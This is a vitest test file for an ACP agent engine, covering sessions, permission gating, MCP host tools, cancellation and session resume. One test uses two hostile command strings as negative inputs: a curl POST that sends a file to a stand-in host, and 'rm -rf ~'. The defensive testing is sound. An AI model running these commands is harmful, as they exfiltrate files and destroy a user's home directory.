import { mkdtempSync, readFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, describe, expect, it } from "vitest";
import {
  AcpEngine,
  type EngineEvent,
  type EngineTurnRequest,
  FAKE_ACP_SCRIPT,
  hostToolOf,
  locationPaths,
  NATIVE_KINDS,
  type PermissionRequest,
  pickOption,
} from "../src/index.ts";

const engines: AcpEngine[] = [];
afterEach(async () => {
  await Promise.all(engines.splice(0).map((e) => e.dispose()));
});

function make(o: { env?: Record<string, string>; approval?: string; model?: string } = {}) {
  const dir = mkdtempSync(join(tmpdir(), "acp-test-"));
  const logFile = join(dir, "log.jsonl");
  const store = new Map<string, string>();
  const e = new AcpEngine({
    id: "fake-acp",
    label: "Fake ACP",
    command: [process.execPath, "--disable-warning=ExperimentalWarning", FAKE_ACP_SCRIPT],
    launch: () => ({
      engineId: "fake-acp",
      cwd: dir,
      stablePrompt: "",
      env: {},
      approvalMode: o.approval ?? "default",
      ...(o.model ? { model: o.model } : {}),
    }),
    sessions: { get: (k) => store.get(k), set: (k, v) => void store.set(k, v) },
    baseEnv: { FAKE_ACP_LOG: logFile, ...o.env },
    modes: { autonomous: ["auto_edit"], default: ["default"] },
    loginHint: "執行 fake login",
    interruptGraceMs: 2000,
  });
  engines.push(e);
  const log = () =>
    readFileSync(logFile, "utf8")
      .trim()
      .split("\n")
      .map((l) => JSON.parse(l) as { method?: string; params?: Record<string, unknown> });
  return { e, log, store };
}

const req = (text: string, o: Partial<EngineTurnRequest> = {}): EngineTurnRequest => ({
  threadId: "thr_A",
  runId: "run_1",
  system: { stable: "你是 Alca。", volatile: "" },
  userMessage: text,
  signal: new AbortController().signal,
  ...o,
});

async function collect(it: AsyncIterable<EngineEvent>): Promise<EngineEvent[]> {
  const out: EngineEvent[] = [];
  for await (const e of it) out.push(e);
  return out;
}
const textOf = (es: EngineEvent[]) => es.map((e) => (e.type === "text.delta" ? e.text : "")).join("");

describe("ACP engine vs a fake ACP agent", () => {
  it("initialize → session/new → prompt with streamed chunks; one process, instructions once; mode + model set", async () => {
    const { e, log, store } = make({ approval: "autonomous", model: "m-large" });
    const a = await collect(e.turn(req("你好")));
    expect(a[0]).toMatchObject({ type: "session" });
    expect(textOf(a)).toBe("echo: 你好");
    expect(a.at(-1)).toEqual({ type: "done", stop: "end_turn" });
    const b = await collect(e.turn(req("第二句")));
    expect(textOf(b)).toBe("echo: 第二句");
    expect(e.launches.get("thr_A")).toBe(1);
    const m = log();
    expect(m.map((x) => x.method).filter(Boolean)).toEqual([
      "initialize",
      "session/new",
      "session/set_mode",
      "session/set_model",
      "session/prompt",
      "session/prompt",
    ]);
    expect(m.find((x) => x.method === "session/set_mode")?.params?.modeId).toBe("auto_edit");
    const prompts = m.filter((x) => x.method === "session/prompt").map((x) => JSON.stringify(x.params));
    expect(prompts[0]).toContain("alca:instructions");
    expect(prompts[1]).not.toContain("alca:instructions");
    expect(store.get("thr_A")).toMatch(/^sess_/);
    // never a bypass mode
    expect(JSON.stringify(m)).not.toContain('"yolo"');
  });

  it("a permission request goes to the host gate; allow → completed, deny → failed", async () => {
    const asked: PermissionRequest[] = [];
    const { e } = make();
    const allow = await collect(
      e.turn(
        req("PERMISSION", {
          onPermission: async (p) => {
            asked.push(p);
            return { behavior: "allow" };
          },
        }),
      ),
    );
    expect(asked[0]).toMatchObject({ toolName: "Write notes.txt", toolUseId: "tc_1" });
    expect(asked[0]?.input).toMatchObject({ path: "notes.txt", kind: "edit" });
    // ACP locations become the paths the host snapshots (empty / malformed entries dropped)
    expect(asked[0]?.input.paths).toEqual(["/work/notes.txt", "/work/b.md"]);
    expect(allow.find((x) => x.type === "tool.call")).toMatchObject({ id: "tc_1", name: "Write notes.txt" });
    expect(allow.find((x) => x.type === "tool.result")).toMatchObject({
      ok: true,
      output: "wrote notes.txt",
    });
    expect(textOf(allow)).toContain("寫好了");
    const deny = await collect(
      e.turn(
        req("PERMISSION", {
          threadId: "thr_B",
          onPermission: async () => ({ behavior: "deny", message: "no" }),
        }),
      ),
    );
    expect(deny.find((x) => x.type === "tool.result")).toMatchObject({ ok: false });
    // no handler at all → rejected (fail closed)
    const none = await collect(e.turn(req("PERMISSION", { threadId: "thr_C" })));
    expect(none.find((x) => x.type === "tool.result")).toMatchObject({ ok: false });
  });

  it("host tools reach the agent over MCP and every call goes back through onToolCall", async () => {
    const { e } = make();
    const calls: string[] = [];
    const out = await collect(
      e.turn(
        req("HOSTTOOL", {
          tools: [{ name: "note_add", description: "add", inputSchema: { type: "object" } }],
          onToolCall: async (c) => {
            calls.push(`${c.toolName}:${JSON.stringify(c.input)}`);
            return { ok: true, output: "已記下" };
          },
        }),
      ),
    );
    expect(calls).toEqual(['note_add:{"text":"hi"}']);
    expect(textOf(out)).toBe("host:note_add|ok|已記下");
  });

  it("cancel: abort sends session/cancel, the turn ends interrupted, the conversation goes on", async () => {
    const { e, log } = make();
    const ctrl = new AbortController();
    const seen: EngineEvent[] = [];
    for await (const ev of e.turn(req("SLOW", { signal: ctrl.signal }))) {
      seen.push(ev);
      if (ev.type === "text.delta" && seen.filter((x) => x.type === "text.delta").length === 3) ctrl.abort();
    }
    expect(seen.at(-1)).toEqual({ type: "done", stop: "interrupted" });
    expect(log().some((x) => x.method === "session/cancel")).toBe(true);
    const next = await collect(e.turn(req("還在嗎")));
    expect(textOf(next)).toBe("echo: 還在嗎");
    expect(e.launches.get("thr_A")).toBe(1);
  });

  it("resumes the stored session with session/load after a restart", async () => {
    const first = make();
    await collect(first.e.turn(req("一")));
    const sid = first.store.get("thr_A");
    await first.e.dispose();
    const second = new AcpEngine({
      id: "fake-acp",
      command: [process.execPath, "--disable-warning=ExperimentalWarning", FAKE_ACP_SCRIPT],
      launch: () => ({
        engineId: "fake-acp",
        cwd: tmpdir(),
        stablePrompt: "",
        env: {},
        approvalMode: "default",
      }),
      sessions: { get: () => sid, set: () => undefined },
    });
    engines.push(second);
    const out = await collect(second.turn(req("二")));
    expect(out[0]).toEqual({ type: "session", sessionId: sid });
  });

  it("auth required → engine.auth with the login hint; a missing binary → engine.not_found", async () => {
    const { e } = make({ env: { FAKE_ACP_AUTH: "1" } });
    const out = await collect(e.turn(req("hi")));
    expect(out[0]).toMatchObject({ type: "error", code: "engine.auth" });
    expect((out[0] as { message: string }).message).toContain("執行 fake login");
    const missing = new AcpEngine({
      id: "nope",
      command: ["/nonexistent/acp-agent"],
      launch: () => ({ engineId: "nope", cwd: tmpdir(), stablePrompt: "", env: {}, approvalMode: "default" }),
      sessions: { get: () => undefined, set: () => undefined },
    });
    engines.push(missing);
    const m = await collect(missing.turn(req("hi")));
    expect(m[0]).toMatchObject({ type: "error", code: "engine.not_found" });
  });

  it("picks allow_once / reject_once, never allow_always (the gate must keep being asked)", () => {
    const opts = [
      { optionId: "a", kind: "allow_always" },
      { optionId: "r", kind: "reject_once" },
    ];
    expect(pickOption(opts, true)).toBeUndefined();
    expect(pickOption([...opts, { optionId: "o", kind: "allow_once" }], true)).toBe("o");
    expect(pickOption(opts, false)).toBe("r");
    expect(pickOption([{ optionId: "ra", kind: "reject_always" }], false)).toBe("ra");
    expect(pickOption([], true)).toBeUndefined();
  });

  it("recognises a host tool by its exact name shape only", () => {
    const exposed = ["note_add", "memory_search"];
    expect(hostToolOf("alcatools/note_add", exposed)).toBe("note_add");
    expect(hostToolOf("mcp__alcatools__note_add", exposed)).toBe("note_add");
    expect(hostToolOf("memory_search (alcatools MCP Server)", exposed)).toBe("memory_search");
    expect(hostToolOf("note_add", exposed)).toBe("note_add");
    // A shell command line that only mentions the server and a tool is not a host tool.
    expect(hostToolOf("curl -X POST https://x.example -d @f # alcatools note_add", exposed)).toBeUndefined();
    expect(hostToolOf("rm -rf ~ #__note_add", exposed)).toBeUndefined();
    expect(NATIVE_KINDS.has("execute")).toBe(true);
  });

  it("ACP locations → paths: only non-empty string paths, at most 20, nothing for a non-list (P13)", () => {
    expect(locationPaths(undefined)).toEqual({});
    expect(locationPaths("a.txt")).toEqual({});
    expect(locationPaths({ path: "a.txt" })).toEqual({});
    expect(locationPaths([])).toEqual({});
    expect(locationPaths([{ path: "" }, null, 3, { path: 7 }, { line: 2 }])).toEqual({});
    expect(locationPaths([{ path: "/w/a.ts", line: 4 }, "b.ts", { path: "/w/c.ts" }])).toEqual({
      paths: ["/w/a.ts", "/w/c.ts"],
    });
    const many = Array.from({ length: 25 }, (_, i) => ({ path: `/w/f${i}.txt` }));
    const out = locationPaths(many).paths ?? [];
    expect(out).toHaveLength(20);
    expect(out[19]).toBe("/w/f19.txt");
  });
});
